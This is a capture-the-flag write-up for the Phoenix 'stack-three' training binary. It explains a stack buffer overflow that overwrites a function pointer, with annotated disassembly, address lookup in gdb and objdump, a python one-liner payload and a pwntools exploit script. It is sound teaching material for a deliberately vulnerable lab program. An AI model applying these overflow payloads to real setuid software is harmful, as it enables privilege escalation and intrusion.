# Stack Three
Stack Three is the fourth challenge of the Phoenix exploitation set of challenges, it is available at https://exploit.education/

## Taking a first look at the binary
The binary name is `stack-three`, it has the setuid and setgid bit enabled which means it can be run as root with most users on the system

It has been compiled as a ELF 64-bit LSB (little endian) binary and is not stripped you can see by yourself by looking at following output :
```bash
$ file stack-three   
stack-three: setuid, setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /opt/phoenix/x86_64-linux-musl/lib/ld-musl-  
x86_64.so.1, not stripped
```

We also gonna check it with checksec just in case, it shouldn't be useful with this challenge but it's always a good practice to check if there's PIE/NX/ASLR/RELRO enabled on the executable
```
$ checksec stack-two  
[*] '/opt/phoenix/amd64/stack-two'  
   Arch:     amd64-64-little  
   RELRO:    No RELRO  
   Stack:    No canary found  
   NX:       NX disabled  
   PIE:      No PIE (0x400000)  
   RWX:      Has RWX segments  
   RPATH:    b'/opt/phoenix/x86_64-linux-musl/lib'
```
In this case everything seems disabled and we even have RWX segments, which means we could read, write and execute data in those segments, once again it's just the second challenge so i don't think it's going to be pretty useful.

# Oops
So far we did the challenges without looking at the website and it's my bad..., apparently you can see the source code and what to do on every challenges on the exploit.education website so we're going to first take a look at the stack-three on exploit.education, which you can access at the following link :
http://exploit.education/phoenix/stack-three/

So we're presented with a couple of information about the challenge...
```
Stack Three looks at overwriting function pointers stored on the stack.
Hints :
	- You can use gdb and objdump to determine where the complete_level() function is in memory.

```

And with the following source code
```c
/*
 * phoenix/stack-three, by https://exploit.education
 *
 * The aim is to change the contents of the changeme variable to 0x0d0a090a
 *
 * When does a joke become a dad joke?
 *   When it becomes apparent.
 *   When it's fully groan up.
 *
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  exit(0);
}

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int (*fp)();
  } locals;

  printf("%s\n", BANNER);

  locals.fp = NULL;
  gets(locals.buffer);

  if (locals.fp) {
    printf("calling function pointer @ %p\n", locals.fp);
    fflush(stdout);
    locals.fp();
  } else {
    printf("function pointer remains unmodified :~( better luck next time!\n");
  }

  exit(0);
}
```

We can see in our struct we declared a function pointer using the `volatile` keyword, volatile is used to inform the compiler that the function can point to somewhere else in memory at any time. this allow us to change it's value and make it jump to our `complete_level()` function without causing the program to crash.
## How the challenge works
So by looking at the source code we can see how the challenge works, it's pretty simple...

The first thing we do in main is declare a struct that contains a buffer (which we will overflow), and a function pointer (which we will overwrite), and declare that struct with the name `locals`.

The next thing we do is set `locals.fp` (our function pointer that currently does nothing) to `NULL`, this way we can check if our function points to a valid `address` or is equal to `NULL` . 

After this we have a call to `gets` that take 64 bytes of data, so if we send more than 64 bytes to it we'll start overwriting data on the stack.

Following this logic, we can potentially overwrite our function pointer stored on the stack using our `locals.buffer` variable that is also stored on the stack.

Let's look at the assembly of our program 
```asm
Dump of assembler code for function main:  
  0x00000000004006b5 <+0>:     push   rbp  
  0x00000000004006b6 <+1>:     mov    rbp,rsp  
  0x00000000004006b9 <+4>:     sub    rsp,0x60  
  0x00000000004006bd <+8>:     mov    DWORD PTR [rbp-0x54],edi      ;mov our program number of arguments into rbp-0x54 this takes 4 bytes on the stack [rbp-0x54 to rbp-0x50]
  0x00000000004006c0 <+11>:    mov    QWORD PTR [rbp-0x60],rsi      ;mov our argv[0] which is the program name into rbp-0x60,and it is placed from rbp-0x54 to rbp-0x60 and takes 12 bytes on the stack
  0x00000000004006c4 <+15>:    mov    edi,0x4007d8  
  0x00000000004006c9 <+20>:    call 0x4004f0 <puts@plt>  
  0x00000000004006ce <+25>:    mov    QWORD PTR [rbp-0x10],0x0      ;mov null into locals.fp, this is placed at rbp-0x0 to rbp-0x10 and takes 16 bytes on the stack
  0x00000000004006d6 <+33>:    lea    rax,[rbp-0x50]                ;mov the value at rbp-0x50 which is our locals.buffer into rax, we are left with 64 bytes of space on the stack so we can deduce that locals.buffer is 64 bytes in size, we can confirm this by looking at the source, also we can deduce that rbp-0x10 to rbp-0x50 will be allocated for our buffer.
  0x00000000004006da <+37>:    mov    rdi,rax                       ;mov our local buffer into rdi
  0x00000000004006dd <+40>:    call 0x4004e0 <gets@plt>             ;call gets
  0x00000000004006e2 <+45>:    mov    rax,QWORD PTR [rbp-0x10]      ;mov our function pointer into rax
  0x00000000004006e6 <+49>:    test   rax,rax                       ;check that our function pointer is not null
  0x00000000004006e9 <+52>:    je 0x40071d <main+104>               ;jump if function pointer == NULL(0x0)
  0x00000000004006eb <+54>:    mov    rax,QWORD PTR [rbp-0x10]  
  0x00000000004006ef <+58>:    mov    rsi,rax  
  0x00000000004006f2 <+61>:    mov    edi,0x400828  
  0x00000000004006f7 <+66>:    mov    eax,0x0  
  0x00000000004006fc <+71>:    call 0x4004d0 <printf@plt>  
  0x0000000000400701 <+76>:    mov    rax,QWORD PTR [rip+0x200418]
  0x0000000000400708 <+83>:    mov    rdi,rax  
  0x000000000040070b <+86>:    call 0x400500 <fflush@plt>  
  0x0000000000400710 <+91>:    mov    rdx,QWORD PTR [rbp-0x10]  
  0x0000000000400714 <+95>:    mov    eax,0x0  
  0x0000000000400719 <+100>:   call   rdx                          ;execute our function pointer
  0x000000000040071b <+102>:   jmp 0x400727 <main+114>  
  0x000000000040071d <+104>:   mov    edi,0x400848  
  0x0000000000400722 <+109>:   call 0x4004f0 <puts@plt>  
  0x0000000000400727 <+114>:   mov    edi,0x0  
  0x000000000040072c <+119>:   call 0x400510 <exit@plt>
```

I tried to describe as much as possible what the program is doing using comments, you should have a pretty good understanding of what it does.

## First Run
So we can now run our program for the first time, we already know pretty much how our program works but let's try it.
```bash
$ ./stack-three  
Welcome to phoenix/stack-three, brought to you by https://exploit.education  
pwntest  
function pointer remains unmodified :~( better luck next time!
```

Alright function pointer remains unmodified, let's try to overwrite our function pointers with a 4 B's
```bash
$ ./stack-three <<<$(python -c "print('A'*64 + 'B'*4)")  
Welcome to phoenix/stack-three, brought to you by https://exploit.education  
calling function pointer @ 0x42424242  
zsh: segmentation fault  ./stack-three <<< $(python -c "print('A'*64 + 'B'*4)")
```

We see that we successfully overwritten our function pointer using 0x42424242, we also have a segmentation fault because the programs actually tries to execute the function pointer because it has been modified, but the address 0x42424242 doesn't contains a valid function to jump to so the program cause a segmentation fault.

## Finding complete_level() address
So we're going to need to find our `complete_level()` function address, for this we'll use `gdb`, `objdump` and we will make our script to win the challenge with `pwntools`

### GDB
To find a function address in gdb it is super simple, you first start your program in gdb using the following command
`gdb ./stack-three`
Then you can find information about the functions using the `info functions` command as shown in the following output
```
Non-debugging symbols:  
0x00000000004004b0 _init  
0x00000000004004d0 printf@plt  
0x00000000004004e0 gets@plt  
0x00000000004004f0 puts@plt  
0x0000000000400500 fflush@plt  
0x0000000000400510 exit@plt  
0x0000000000400520 __libc_start_main@plt  
0x0000000000400530 _start  
0x0000000000400546 _start_c  
0x0000000000400570 deregister_tm_clones  
0x00000000004005a0 register_tm_clones  
0x00000000004005e0 __do_global_dtors_aux  
0x0000000000400670 frame_dummy  
0x000000000040069d complete_level  
0x00000000004006b5 main  
0x0000000000400740 __do_global_ctors_aux  
0x0000000000400782 _fini
```

Here we're interested in `complete_level` which is stored at the address `40069d`, in my case ASLR is disabled so i can just use that address in a python one liner and we should win, optimally we would write a script to determine the address of `complete_level` at runtime.

The creators of the challenge left us this notice (remember at the beginning)
`You can use gdb and objdump to determine where the complete_level() function is in memory.`, so this time we'll use `objdump` to determine the address

```
$ objdump -D /opt/phoenix/amd64/stack-three | grep complete_level  
000000000040069d <complete_level>:
```

And we can see it's address which is the same we found with GDB.

## Win the challenge
To win this challenge we'll first use a python one liner inputed into our program using input operators `<<<`, here's the following one line to win this challenge
```bash
$ /opt/phoenix/amd64/stack-three <<<$(python -c 'print("A"*64 + "\x9d\x06\  
x40")')  
Welcome to phoenix/stack-three, brought to you by https://exploit.education  
calling function pointer @ 0x40069d  
Congratulations, you've finished phoenix/stack-three :-) Well done!
```

## Script to win this challenge
I also made a small script using pwntools as promised to win this challenge, if you're into binary exploitation you should highly consider using pwntools, this script is more useful in scenarios where ASLR is enabled, this allows you to determine the address of the function at runtime.
```python
#!/usr/bin/python3  
from pwn import *  
  
io = process("/opt/phoenix/amd64/stack-three")  
complete_func = ELF("/opt/phoenix/amd64/stack-three").symbols["complete_leve  
l"]  
log.info("complete_level address : " + hex(complete_func))  
complete_func_address = p64(int(hex(complete_func), 16), endian="little")  
io.sendlineafter(b"https://exploit.education", b"A"*64 + complete_func_addre  
ss)  
io.interactive()
```
